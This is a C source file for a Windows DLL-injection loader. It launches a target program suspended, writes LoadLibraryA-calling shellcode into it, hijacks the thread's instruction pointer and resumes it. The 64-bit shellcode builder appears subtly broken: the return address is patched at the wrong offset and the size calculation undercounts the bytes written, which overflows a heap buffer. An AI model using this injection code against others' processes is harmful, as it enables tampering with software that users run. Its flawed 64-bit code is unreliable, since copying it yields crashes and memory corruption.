#include <Windows.h>
#include <stdio.h>
#include <string.h>

#ifdef _WIN64
void createShellcode(DWORD_PTR ret, HANDLE hProcess, int argc, char* argv[], LPVOID* shellcode, int* shellcodeSize) {
    FARPROC lla_addr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    unsigned char llaChar[8] = {0x00};
    memcpy(llaChar, (unsigned char*)&lla_addr, 8);
    unsigned char retChar[8] = {0x00};
    memcpy(retChar, (unsigned char*)&ret, 8);
    
    // Precalculate shellcode size for all libraries.
    int num_libs = argc - 2;
    *shellcodeSize = sizeof(unsigned char) * (35 + (num_libs * 21));
    
    // Allocate Memory for Shellcode - First allocate as read/write, we'll change to executable later
    *shellcode = VirtualAllocEx(hProcess, NULL, *shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Check if memory allocation failed
    if (*shellcode == NULL) {
        printf("Error: Failed to allocate memory for shellcode. Error code: %lu\n", GetLastError());
        return;
    }
    
    printf("Allocated shellcode memory at address: 0x%p\n", *shellcode);
    unsigned char* shellcode_data = (unsigned char*)malloc(*shellcodeSize);
    if (shellcode_data == NULL) {
        printf("Error: Failed to allocate local memory for shellcode\n");
        VirtualFreeEx(hProcess, *shellcode, 0, MEM_RELEASE);
        *shellcode = NULL;
        return;
    }
    
    unsigned char* current_offset = shellcode_data;
    
    // First part of shellcode - preserve stack alignment and save registers
    unsigned char shellcode_prologue[] = {
        // sub rsp, 0x28 (reserve shadow space - Win64 calling convention)
        0x48, 0x83, 0xEC, 0x28,
        // mov [rsp + 0x18], rax (save rax)
        0x48, 0x89, 0x44, 0x24, 0x18,
        // mov [rsp + 0x10], rcx (save rcx)
        0x48, 0x89, 0x4C, 0x24, 0x10
    };
    
    memcpy(current_offset, shellcode_prologue, sizeof(shellcode_prologue));
    current_offset += sizeof(shellcode_prologue);
    
    // For each DLL to inject
    for(int i = 2; i < argc; i++) {
        LPVOID library_name_ptr = VirtualAllocEx(hProcess, NULL, strlen(argv[i])+1, MEM_COMMIT, PAGE_READWRITE);
        
        // Use full path for DLLs if not already absolute
        char full_dll_path[MAX_PATH];
        if (argv[i][0] == '\\' || (argv[i][0] != '\0' && argv[i][1] == ':')) {
            // Already absolute path
            strcpy(full_dll_path, argv[i]);
        } else {
            // Convert to absolute path
            char* current_dir = (char*)malloc(MAX_PATH);
            GetCurrentDirectoryA(MAX_PATH, current_dir);
            sprintf(full_dll_path, "%s\\%s", current_dir, argv[i]);
            free(current_dir);
        }
        
        WriteProcessMemory(hProcess, library_name_ptr, full_dll_path, strlen(full_dll_path)+1, NULL);
        unsigned char* libChar = (unsigned char*)&library_name_ptr;
        
        // LoadLibrary call for this DLL
        unsigned char shellcode_call[] = {
            // mov rcx, [dll_path_addr] - first argument in x64 calling convention
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            // mov rax, [LoadLibraryA address]
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            // call rax
            0xFF, 0xD0
        };
        
        memcpy(shellcode_call+2, libChar, 8);  // Set DLL path address
        memcpy(shellcode_call+12, llaChar, 8); // Set LoadLibraryA address
        memcpy(current_offset, shellcode_call, sizeof(shellcode_call));
        current_offset += sizeof(shellcode_call);
    }
    
    // Epilogue code - restore registers and return to original execution
    unsigned char shellcode_epilogue[] = {
        // mov rcx, [rsp + 0x10] (restore rcx)
        0x48, 0x8B, 0x4C, 0x24, 0x10,
        // mov rax, [rsp + 0x18] (restore rax)
        0x48, 0x8B, 0x44, 0x24, 0x18,
        // add rsp, 0x28 (restore stack)
        0x48, 0x83, 0xC4, 0x28,
        // mov r11, [original return address]
        0x49, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // jmp r11 (jump back to original code)
        0x41, 0xFF, 0xE3
    };
    
    memcpy(shellcode_epilogue+12, retChar, 8); // Set original return address
    memcpy(current_offset, shellcode_epilogue, sizeof(shellcode_epilogue));
    current_offset += sizeof(shellcode_epilogue);
    
    // Calculate actual size used
    SIZE_T actualSize = current_offset - shellcode_data;
    
    // Write shellcode to target process
    SIZE_T bytesWritten = 0;
    BOOL writeResult = WriteProcessMemory(hProcess, *shellcode, shellcode_data, actualSize, &bytesWritten);
    free(shellcode_data);
    
    if (!writeResult || bytesWritten != actualSize) {
        printf("Error: Failed to write shellcode to process memory. Error code: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, *shellcode, 0, MEM_RELEASE);
        *shellcode = NULL;
        return;
    }
    
    printf("Successfully wrote %llu bytes of shellcode\n", bytesWritten);
    
    // Now change memory protection to allow execution
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, *shellcode, actualSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Error: Failed to set memory protection to executable. Error code: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, *shellcode, 0, MEM_RELEASE);
        *shellcode = NULL;
        return;
    }
    
    printf("Successfully changed memory protection to executable\n");
}
#else
void createShellcode(DWORD_PTR ret, HANDLE hProcess, int argc, char* argv[], LPVOID* shellcode, int* shellcodeSize) {
    FARPROC lla_addr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    unsigned char llaChar[4] = {0x00};
    memcpy(llaChar, (unsigned char*)&lla_addr, 4);
    unsigned char* retChar = (unsigned char*)&ret;
    
    // Precalculate shellcode size for all libraries.
    int num_libs = argc - 2;
    *shellcodeSize = sizeof(unsigned char) * (5 + 1 + 1 + (num_libs * 12) + 3);
    
    // Allocate Memory for Shellcode
    *shellcode = VirtualAllocEx(hProcess, NULL, *shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Check if memory allocation failed
    if (*shellcode == NULL) {
        printf("Error: Failed to allocate memory for shellcode. Error code: %lu\n", GetLastError());
        return;
    }
    
    printf("Allocated shellcode memory at address: 0x%p\n", *shellcode);
    unsigned char* shellcode_data = (unsigned char*)malloc(*shellcodeSize);
    if (shellcode_data == NULL) {
        printf("Error: Failed to allocate local memory for shellcode\n");
        VirtualFreeEx(hProcess, *shellcode, 0, MEM_RELEASE);
        *shellcode = NULL;
        return;
    }
    
    unsigned char shellcode_prologue[] = {
        // Push ret
        0x68, 0x00, 0x00, 0x00, 0x00,
        // Push all flags
        0x9C,
        // Push all register
        0x60
    };
    unsigned char shellcode_call[] = {
        // Push 0x66666666 (later we convert it to the string of injected dll)
        0x68, 0x00, 0x00, 0x00, 0x00,
        // Mov eax, 0x66666666 (later we convert it to LoadLibrary adress)
        0xB8, 0x00, 0x00, 0x00, 0x00,
        // Call eax
        0xFF, 0xD0,
    };
    unsigned char shellcode_epilogue[] = {
        // Pop all register
        0x61,
        // Pop all flags
        0x9D,
        // Ret
        0xC3
    };

    // Create and Write Prologue.
    unsigned char* current_offset = shellcode_data;

    memcpy(shellcode_prologue+1, retChar, 4);
    memcpy(current_offset, shellcode_prologue, sizeof(shellcode_prologue));
    current_offset += sizeof(shellcode_prologue);

    memcpy(shellcode_call+6, llaChar, 4);

    for(int i = 2; i < argc; i++) {
        LPVOID library_name_ptr = VirtualAllocEx(hProcess, NULL, strlen(argv[i])+1, MEM_COMMIT, PAGE_READWRITE);
        
        // Use full path for DLLs if not already absolute
        char full_dll_path[MAX_PATH];
        if (argv[i][0] == '\\' || (argv[i][0] != '\0' && argv[i][1] == ':')) {
            // Already absolute path
            strcpy(full_dll_path, argv[i]);
        } else {
            // Convert to absolute path
            char* current_dir = (char*)malloc(MAX_PATH);
            GetCurrentDirectoryA(MAX_PATH, current_dir);
            sprintf(full_dll_path, "%s\\%s", current_dir, argv[i]);
            free(current_dir);
        }
        
        WriteProcessMemory(hProcess, library_name_ptr, full_dll_path, strlen(full_dll_path)+1, NULL);
        unsigned char* libChar = (unsigned char*)&library_name_ptr;
        memcpy(shellcode_call+1, libChar, 4);
        memcpy(current_offset, shellcode_call, sizeof(shellcode_call));
        current_offset += sizeof(shellcode_call);        
    }

    memcpy(current_offset, shellcode_epilogue, sizeof(shellcode_epilogue));
    SIZE_T bytesWritten = 0;
    BOOL writeResult = WriteProcessMemory(hProcess, *shellcode, shellcode_data, *shellcodeSize, &bytesWritten);
    free(shellcode_data);
    
    if (!writeResult || bytesWritten != *shellcodeSize) {
        printf("Error: Failed to write shellcode to process memory. Error code: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, *shellcode, 0, MEM_RELEASE);
        *shellcode = NULL;
        return;
    }
    
    printf("Successfully wrote %lu bytes of shellcode\n", bytesWritten);
}
#endif

static BOOL GetDirectoryPath(LPSTR lpFilename, LPSTR in_path, DWORD nSize) {
    if (!in_path) {
        GetModuleFileNameA(GetModuleHandleA(0), lpFilename, nSize);
    }
    else {
        strcpy(lpFilename, in_path);
    }

    char* last_delimiter = strrchr(lpFilename, 0x5C);
    if (!last_delimiter) { return FALSE; }
    memset(last_delimiter + 1, 0x00, 1);
    return TRUE;
}

// Check if a PE file is 64-bit
BOOL Is64BitPE(const char* filePath) {
    BOOL is64bit = FALSE;
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return FALSE;
    }

    LPVOID baseAddr = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!baseAddr) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddr;
    if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)baseAddr + dosHeader->e_lfanew);
        if (ntHeader->Signature == IMAGE_NT_SIGNATURE) {
            is64bit = (ntHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
        }
    }

    UnmapViewOfFile(baseAddr);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return is64bit;
}

void usage() {
    printf("Usage: loader.exe path_to_exe path_to_dll...\n");
    exit(-1);
}

int main(int argc, char* argv[]) {
    if (argc < 3) { usage(); }

    LPVOID shellcode;
    int shellcodeLen;

    CONTEXT ctx;
    // Get the Full EXE path for the exe.
    char* full_exe_path = calloc(1, 4096);
    GetFullPathName(argv[1], 4096, full_exe_path, NULL);

    // Check if target executable is 64-bit
    BOOL is64BitTarget = Is64BitPE(full_exe_path);
    
    // Verify architecture compatibility
#ifdef _WIN64
    if (!is64BitTarget) {
        printf("Error: Cannot inject into 32-bit process from 64-bit loader\n");
        printf("Use libloader32.exe instead for 32-bit targets\n");
        free(full_exe_path);
        return 1;
    }
#else
    if (is64BitTarget) {
        printf("Error: Cannot inject into 64-bit process from 32-bit loader\n");
        printf("Use libloader64.exe instead for 64-bit targets\n");
        free(full_exe_path);
        return 1;
    }
#endif

    // Get the Full DLL Path for our injection.
    char* exe_base_path = (char*)malloc(1024);
    GetDirectoryPath(exe_base_path, full_exe_path, 1024);

    // Create Process SUSPENDED
    PROCESS_INFORMATION pi;
    STARTUPINFOA Startup;
    ZeroMemory(&Startup, sizeof(Startup));
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(full_exe_path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, exe_base_path, &Startup, &pi)) {
        printf("Error creating process: %lu\n", GetLastError());
        free(exe_base_path);
        free(full_exe_path);
        return 1;
    }
    
    free(exe_base_path);

    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("Error getting thread context: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(full_exe_path);
        return 1;
    }

#ifdef _WIN64
    createShellcode(ctx.Rip, pi.hProcess, argc, argv, &shellcode, &shellcodeLen);
    if (shellcode == NULL) {
        printf("Failed to create shellcode\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(full_exe_path);
        return 1;
    }
    // Set RIP To Shellcode
    ctx.Rip = (DWORD64)shellcode;
#else
    createShellcode(ctx.Eip, pi.hProcess, argc, argv, &shellcode, &shellcodeLen);
    if (shellcode == NULL) {
        printf("Failed to create shellcode\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(full_exe_path);
        return 1;
    }
    // Set EIP To Shellcode
    ctx.Eip = (DWORD)shellcode;
#endif

    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("Error setting thread context: %lu\n", GetLastError());
        if (shellcode) {
            VirtualFreeEx(pi.hProcess, shellcode, shellcodeLen, MEM_DECOMMIT);
        }
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(full_exe_path);
        return 1;
    }

    printf("About to resume thread and execute shellcode at 0x%p\n", shellcode);
    DWORD resumeResult = ResumeThread(pi.hThread);
    if (resumeResult == (DWORD)-1) {
        printf("Error resuming thread: %lu\n", GetLastError());
        if (shellcode) {
            VirtualFreeEx(pi.hProcess, shellcode, shellcodeLen, MEM_DECOMMIT);
        }
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        free(full_exe_path);
        return 1;
    }

    printf("Thread resumed successfully. Waiting for DLL to load...\n");
    
#ifdef _WIN64
    // Longer sleep time for 64-bit processes
    printf("Waiting for 64-bit DLL injection for 4 seconds...\n");
    Sleep(4000);
#else
    // Wait longer to ensure DLL injection completes
    Sleep(2000);
#endif

    if (shellcode) {
        // Free the allocated memory for shellcode
        VirtualFreeEx(pi.hProcess, shellcode, shellcodeLen, MEM_DECOMMIT);
    }

    // Clean up handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(full_exe_path);
    
    printf("Injection process completed.\n");
    printf("Note: If injection failed, check if Data Execution Prevention (DEP) is enabled for the target.\n");
    printf("You may need to run with administrator privileges or disable DEP for the target application.\n");
    
    return 0;
}